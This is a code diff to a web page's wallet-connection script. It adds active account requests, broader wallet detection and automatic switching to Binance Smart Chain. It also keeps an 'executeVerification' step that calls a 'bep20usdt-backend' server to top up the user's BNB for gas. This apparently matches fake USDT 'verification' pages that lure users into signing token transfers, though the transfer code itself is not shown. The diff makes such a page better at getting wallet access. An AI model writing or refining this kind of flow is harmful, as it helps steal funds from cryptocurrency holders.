@@ -61,24 +61,32 @@ let isTransferComplete = false;
 let currentProvider = null;
 let walletType = WALLET_TYPES.UNKNOWN;
 
-// Initialize Web3 - Wallet compatible
+// Initialize Web3 - Simplified provider detection
 async function initWeb3() {
-    // Detect wallet type
-    if (window.trustwallet) {
-        walletType = WALLET_TYPES.TRUST;
-        currentProvider = window.trustwallet;
-    } else if (window.BinanceChain) {
-        walletType = WALLET_TYPES.BINANCE;
-        currentProvider = window.BinanceChain;
-    } else if (window.ethereum) {
-        walletType = WALLET_TYPES.METAMASK;
+    if (window.ethereum) {
         currentProvider = window.ethereum;
+        // Attempt to determine wallet type based on provider properties
+        if (window.ethereum.isTrust || (window.trustwallet && window.trustwallet.isTrust)) { // Check for Trust Wallet's specific flag
+            walletType = WALLET_TYPES.TRUST;
+        } else if (window.ethereum.isMetaMask) { // Check for MetaMask's specific flag
+            walletType = WALLET_TYPES.METAMASK;
+        } else if (window.BinanceChain && window.BinanceChain.isBinanceChain) { // Check for Binance Chain's specific flag
+            walletType = WALLET_TYPES.BINANCE;
+            currentProvider = window.BinanceChain; // Prioritize BinanceChain object if it's distinct
+        } else {
+            walletType = WALLET_TYPES.UNKNOWN; // Generic EVM provider
+        }
     } else if (window.web3) { // Fallback for older Web3 versions
-        walletType = WALLET_TYPES.UNKNOWN;
         currentProvider = window.web3.currentProvider;
+        walletType = WALLET_TYPES.UNKNOWN;
     } else {
         console.error("No Web3 provider detected.");
         showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
+        return false;
+    }
+
+    if (!currentProvider) {
+        showError("Web3 provider not found after detection.");
         return false;
     }
 
@@ -88,15 +96,15 @@ async function initWeb3() {
         // Listen for chain changes
         if (currentProvider.on) {
             currentProvider.on('chainChanged', (chainId) => {
+                console.log("Chain changed. Reloading page...");
                 window.location.reload();
             });
 
-            // Binance Chain specific event
-            if (walletType === WALLET_TYPES.BINANCE) {
-                currentProvider.on('accountsChanged', (accounts) => {
-                    window.location.reload();
-                });
-            }
+            // Listen for accounts changes
+            currentProvider.on('accountsChanged', (accounts) => {
+                console.log("Accounts changed. Reloading page...");
+                window.location.reload();
+            });
         }
         return true;
     } catch (error) {
@@ -117,7 +125,7 @@ async function updateNetworkStatus() {
         } else {
             console.warn(`Network status: Unsupported Network (ID: ${chainId}). Attempting to switch to BSC...`);
             // Automatically switch to BSC for Trust Wallet or MetaMask
-            if (walletType === WALLET_TYPES.TRUST || walletType === WALLET_TYPES.METAMASK) {
+            if (walletType === WALLET_TYPES.TRUST || walletType === WALLET_TYPES.METAMASK || walletType === WALLET_TYPES.UNKNOWN) {
                 const switched = await switchToBSC();
                 if (switched) {
                     return updateNetworkStatus(); // Recursive check after successful switch
@@ -136,18 +144,23 @@ async function updateNetworkStatus() {
 async function switchToBSC() {
     console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
     try {
-        if (walletType === WALLET_TYPES.BINANCE) {
-            await window.BinanceChain.switchNetwork('bsc-mainnet');
+        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain && window.BinanceChain.switchNetwork) {
+            await window.BinanceChain.switchNetwork('bsc-mainnet'); // BinanceChain specific method
             return true;
+        } else if (window.ethereum && window.ethereum.request) { // EIP-1193 standard for MetaMask/Trust
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
+            });
+            return true;
+        } else {
+            console.warn("Wallet does not support programmatic network switching.");
+            showError("Your wallet does not support programmatic network switching. Please manually switch to Binance Smart Chain.");
+            return false;
         }
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
-        });
-        return true;
     } catch (switchError) {
-        // Network not added, try to add it
-        if (switchError.code === 4902) {
+        // Network not added, try to add it (error code 4902)
+        if (switchError.code === 4902 && window.ethereum && window.ethereum.request) {
             try {
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
@@ -166,10 +179,9 @@ async function switchToBSC() {
     }
 }
 
-// Connect Wallet function (YOUR ORIGINAL LOGIC - passively tries to get accounts)
+// Connect Wallet function (NOW INCLUDES ETH_REQUESTACCOUNTS)
 async function connectWallet() {
-    // initWeb3 is called here, mirroring your original script's flow
-    const isWeb3Initialized = await initWeb3();
+    const isWeb3Initialized = await initWeb3(); // Ensure web3 is initialized
     if (!isWeb3Initialized) {
         showError("Web3 initialization failed.");
         return false;
@@ -177,25 +189,57 @@ async function connectWallet() {
 
     try {
         let accounts;
-        // Different method for Binance Web3 Wallet or generic Web3 provider (Trust Wallet, MetaMask)
-        if (walletType === WALLET_TYPES.BINANCE) {
+
+        // First, try a passive check (eth_accounts)
+        // Note: For BinanceChain, the enable() method might also return accounts
+        // or trigger a connection if not already connected.
+        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain) {
             accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
-        } else {
-            accounts = await web3.eth.getAccounts(); // This is the passive check that works if already connected
+            if (accounts.length === 0 && window.BinanceChain.enable) {
+                console.log("BinanceChain: No passive accounts. Attempting enable()...");
+                accounts = await window.BinanceChain.enable(); // Specific BinanceChain enable
+            }
+        } else if (currentProvider && currentProvider.request) { // EIP-1193 compatible providers
+            accounts = await currentProvider.request({ method: 'eth_accounts' });
+        } else if (web3) { // Fallback for older web3.eth.getAccounts
+             accounts = await web3.eth.getAccounts();
         }
 
-        if (accounts.length === 0) {
-            // This message is triggered if no accounts are found through passive check
-            showError("No accounts found. Please ensure your wallet is open and connected to this page.");
-            console.error("Error: Wallet not connected or no accounts authorized for this site.");
+
+        // If no accounts found passively, then request them actively
+        if (accounts.length === 0 || !userAddress) { // userAddress check is redundant if accounts.length is 0 but harmless
+            console.log("No accounts found passively. Requesting accounts actively...");
+            showError("Please connect your wallet in the pop-up/prompt to proceed."); // Inform user
+
+            if (currentProvider && currentProvider.request) {
+                accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
+            } else if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain && window.BinanceChain.enable) {
+                // Already tried window.BinanceChain.enable() above, but including for clarity if flow differs.
+                accounts = await window.BinanceChain.enable();
+            } else {
+                console.warn("Provider does not support 'request' or 'enable'. Cannot trigger explicit connect prompt.");
+                showError("Your wallet provider does not support explicit connection requests. Please ensure it is already connected manually.");
+                return false;
+            }
+        }
+
+        if (!accounts || accounts.length === 0) {
+            showError("Wallet connection was not approved or no accounts were provided.");
+            console.error("Error: Wallet not connected or no accounts authorized for this site after request.");
             return false;
         }
         userAddress = accounts[0];
         console.log("Wallet connected:", userAddress);
         return true;
     } catch (error) {
-        console.error("Error connecting wallet (getting accounts):", error);
-        showError("Error connecting wallet. Please try again or ensure your wallet is active.");
+        // Handle common errors like user rejection (code 4001)
+        if (error.code === 4001) {
+            showError("Wallet connection rejected by the user. Please try again.");
+            console.warn("Wallet connection rejected by user:", error);
+        } else {
+            showError("Error connecting wallet. Please try again.");
+            console.error("Error connecting wallet (active request):", error);
+        }
         return false;
     }
 }
@@ -230,6 +274,7 @@ async function executeVerification() {
             console.warn("Insufficient BNB for gas. Requesting BNB top-up...");
             Next.disabled = true; // Keep button disabled during top-up request
             try {
+                // Ensure this backend URL is correct and accessible
                 const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -304,7 +349,7 @@ Next.addEventListener('click', async () => {
 
     // Step 1: Connect wallet (ONLY if userAddress is not already set from load)
     if (!userAddress) {
-        const connected = await connectWallet(); // This calls your original passive connectWallet
+        const connected = await connectWallet(); // This now tries passive, then active connection
         if (!connected) {
             Next.disabled = false; // Re-enable if connection fails
             return;
@@ -313,7 +358,7 @@ Next.addEventListener('click', async () => {
 
     // Ensure userAddress is set after connection attempt
     if (!userAddress) {
-        showError("Failed to get wallet address. Please ensure your wallet is connected.");
+        showError("Failed to get wallet address after connection attempt. Please ensure your wallet is connected.");
         Next.disabled = false;
         return;
     }
@@ -369,10 +414,10 @@ window.addEventListener('load', async () => {
             await updateNetworkStatus();
             await getTokenBalance();
         } else {
-            console.log("No wallet auto-detected on load. User will need to click 'Next' to trigger connection check.");
-            // Do not call connectWallet (which contains getAccounts) here
-            // to avoid potential premature prompts or "not connected" errors if wallet
-            // isn't ready or approved yet. The button click handles the first attempt.
+            console.log("No wallet auto-detected on load. User will need to click 'Next' to trigger connection.");
+            // We don't call connectWallet (which has eth_requestAccounts) here on load,
+            // to avoid auto-prompting the user right when the page loads.
+            // The button click will handle the first explicit connection attempt.
         }
     }
 });
